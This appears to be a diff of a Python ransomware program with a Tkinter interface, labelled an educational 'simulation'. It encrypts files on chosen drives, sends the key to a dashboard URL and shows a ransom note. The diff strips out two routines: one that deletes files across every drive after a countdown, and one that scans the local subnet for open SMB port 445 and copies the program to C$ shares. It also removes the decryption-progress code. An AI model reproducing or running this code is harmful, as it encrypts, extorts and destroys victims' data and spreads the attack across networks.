@@ -19,8 +19,6 @@ import tkinter as tk
 from tkinter import filedialog, messagebox, simpledialog
 from tkinter import ttk
 from PIL import Image, ImageTk
-import socket
-import shutil
 
 # Step 1: Utility function to get the resource path
 def resource_path(relative_path):
@@ -65,7 +63,7 @@ DRIVES_TO_ENCRYPT = ['F:', 'E:']
 EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
 PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
 DASHBOARD_URL = 'http://localhost'
-MAX_ATTEMPTS = 20
+MAX_ATTEMPTS = 10
 DELAY = 5
 
 # Step 5: Setup logging
@@ -115,6 +113,8 @@ class EncryptionTool:
             logging.info(f"Wallpaper set successfully to {path}.")
         except Exception as e:
             logging.error(f"Failed to set wallpaper: {str(e)}")
+
+
     # Step 9: Function to create important files
     def create_important_files(self, directory_path):
         try:
@@ -187,6 +187,8 @@ Your Security Team
         encoded_key = base64.b64encode(self.key).decode('utf-8')
         payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
         headers = {'Content-Type': 'application/json'}
+
+
         for attempt in range(self.max_attempts):
             logging.info(f"Attempt {attempt + 1} to send encryption key.")
             try:
@@ -278,6 +280,8 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         self.icon_path = icon_path
         self.prompt = prompt
         super().__init__(parent, title)
+
+
     # Step 19: Setup dialog UI
     def body(self, master):
         self.iconbitmap(self.icon_path)
@@ -374,6 +378,8 @@ class DeletionCountdownDialog(tk.Toplevel):
         self.grab_set()
         self.focus_force()
         self.init_ui()
+
+
     # Step 26: Setup deletion countdown dialog UI
     def init_ui(self):
         thanks_image = Image.open(THANKS_PATH).resize((80, 80))
@@ -465,6 +471,8 @@ class DecryptorApp(tk.Tk):
         logo_label = tk.Label(frame, image=logo_photo, bg='black')
         logo_label.image = logo_photo
         logo_label.pack(side=tk.LEFT, padx=(20, 10))
+
+
         ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
         | Attention: Your Files Are Encrypted | \n\n
         This simulation is solely for educational purposes and must not be used maliciously.
@@ -527,6 +535,8 @@ class DecryptorApp(tk.Tk):
         formatted_message = f"[{timestamp}] {message}"
         if self.winfo_exists():
             self.after(0, lambda: self._update_log_listbox(formatted_message, color))
+
+
     # Step 34: Function to update the log listbox
     def _update_log_listbox(self, message, color):
         self.log_listbox.insert(tk.END, message)
@@ -603,56 +613,8 @@ class DecryptorApp(tk.Tk):
                     if f.endswith('.encrypted'):
                         encrypted_files.append(os.path.join(dp, f))
                         self.log(f"Found encrypted file: {os.path.join(dp, f)}")
-        total_files = len(encrypted_files)
-        self.safe_update_progress(0, total_files)
-        decrypted_count = 0
-        for file_path in encrypted_files:
-            if self.decrypt_file(file_path, key):
-                decrypted_count += 1
-                self.safe_update_progress(decrypted_count, total_files)
 
-        if decrypted_count == total_files:
-            self.after(0, self.stop_timer_and_show_success)
-        else:
-            self.after(0, lambda: messagebox.showerror("Decryption Failed",
-                                                       "Failed to decrypt one or more files. Please check the decryption key and try again."))
 
-    # Step 40: Function to show incomplete decryption message
-    def show_incomplete_message(self, decrypted_count, total_files):
-        messagebox.showwarning("Decryption Incomplete", f"Decryption completed for {decrypted_count} out of {total_files} files.")
-
-    # Step 41: Function to safely update the progress bar
-    def safe_update_progress(self, value, maximum):
-        self.after(0, lambda: self.update_progress_bar(value, maximum))
-
-    # Step 42: Function to update the progress bar
-    def update_progress_bar(self, value, maximum):
-        self.progress["value"] = value
-        self.progress["maximum"] = maximum
-        percentage = 100 * (value / maximum) if maximum else 0
-        self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")
-
-    # Step 43: Function to stop the timer and show success message
-    def stop_timer_and_show_success(self):
-        if self.timer_update_id:
-            self.after_cancel(self.timer_update_id)
-            self.timer_update_id = None
-
-        success_message = "All files decrypted successfully. Thank you for your patience."
-        messagebox.showinfo("Decryption Complete", success_message, parent=self)
-
-        self.delete_timer_and_machine_id_files()
-        self.delete_timer_state_file()
-        countdown_dialog = CountdownDialog(self, 10, self.close_application)
-        countdown_dialog.mainloop()
-
-#Part 9: Timer and Cleanup Methods
-
-    #Step 44: Function to start closing countdown
-    def start_closing_countdown (self):
-        countdown_dialog = CountdownDialog(self, 15, self.close_application)
-        countdown_dialog.grab_set()
-        countdown_dialog.mainloop()
     # Step 45: Function to close the application
     def close_application(self):
         try:
@@ -743,114 +705,3 @@ class DecryptorApp(tk.Tk):
             os.remove(TIMER_STATE_FILE)
         except FileNotFoundError:
             pass
-        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
-        for drive in drives:
-            machine_id_path = os.path.join(drive, "Machine_id.txt")
-            try:
-                os.remove(machine_id_path)
-            except FileNotFoundError:
-                pass
-    
-    # Step 54: Function to begin the deletion sequence
-    def begin_deletion_sequence(self):
-        if not self.stop_deletion:
-            self.log("Time is up. Starting file deletion sequence.", 'red')
-            self.deletion_dialog = DeletionCountdownDialog(self, self.stop_deletion_process)
-            self.deletion_process()
-    
-    # Step 55: Function to handle the deletion process
-    def deletion_process(self):
-        self.log("Deletion process initiated.", 'yellow')
-        self.deletion_thread = threading.Thread(target=self.delete_files_with_timing, daemon=True)
-        self.deletion_thread.start()
-
-    # Step 56: Function to delete files with timing
-    def delete_files_with_timing(self):
-        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
-        excluded_directories = {'System Volume Information', '$RECYCLE.BIN', 'Windows'}
-        excluded_files = {'Machine_id.txt', 'READ_ME_FOR_DECRYPTION.txt'}
-
-        def handle_deletion(directory):
-            for current_directory, directories, files in os.walk(directory, topdown=False):
-                if any(excluded in current_directory for excluded in excluded_directories):
-                    continue
-
-                for file in files:
-                    if file in excluded_files:
-                        continue
-                    file_path = os.path.join(current_directory, file)
-                    if not os.access(file_path, os.W_OK):
-                        self.log(f"Access denied to {file_path}", 'Skipping')
-                        continue
-
-                    if self.stop_event.is_set():
-                        self.log("Stop signal received. Ending deletion process.", 'orange')
-                        return
-                    
-                    try:
-                        os.remove(file_path)
-                        self.log(f"Deleted file: {file_path}")
-                    except PermissionError as e:
-                        self.log(f"Permission Error: {e}. Skipping file: {file_path}")
-                    
-                    time.sleep(5)
-
-                    if not directories and not files:
-                        self.log(f"All files have been deleted from: {current_directory}")
-        
-        for drive in drives:
-            d_data_path = os.path.join(drive, 'D_Data')
-            if os.path.exists(d_data_path):
-                self.log(f"Starting deletion in {d_data_path}")
-                handle_deletion(d_data_path)
-                if self.stop_event.is_set():
-                    return
-                
-        for drive in drives:
-            self.log(f"Starting deletion in {drive}")
-            handle_deletion(drive)
-            if self.stop_event.is_set():
-                break
-
-#Part 10: Main Execution
-#Step 57: Check if the Machine ID exists
-if __name__ == "__main__":
-    machine_id = load_machine_id()
-
-    if machine_id:
-        app = DecryptorApp()
-        app.mainloop()
-    else:
-        encryption_tool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSIONS_TO_ENCRYPT, PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
-        encryption_tool.execute()
-        # Auto-spread if port 445 is open on other hosts
-        ransomware_path = os.path.abspath(__file__)
-        scan_and_spread_smb(ransomware_path)
-        app = DecryptorApp()
-        app.mainloop()
-
-# Add SMB spreading function
-
-def scan_and_spread_smb(ransomware_path):
-    # Get local IP range
-    local_ip = socket.gethostbyname(socket.gethostname())
-    ip_parts = local_ip.split('.')
-    base_ip = '.'.join(ip_parts[:3])
-    for i in range(1, 255):
-        target_ip = f"{base_ip}.{i}"
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            result = sock.connect_ex((target_ip, 445))
-            sock.close()
-            if result == 0:
-                # Port 445 is open, try to copy ransomware
-                # Simulate copy to \\target_ip\C$\ransomware.exe
-                target_path = f"\\\\{target_ip}\\C$\\ransomware.exe"
-                try:
-                    shutil.copy(ransomware_path, target_path)
-                    logging.info(f"Spread ransomware to {target_path}")
-                except Exception as e:
-                    logging.warning(f"Failed to spread to {target_ip}: {e}")
-        except Exception:
-            continue
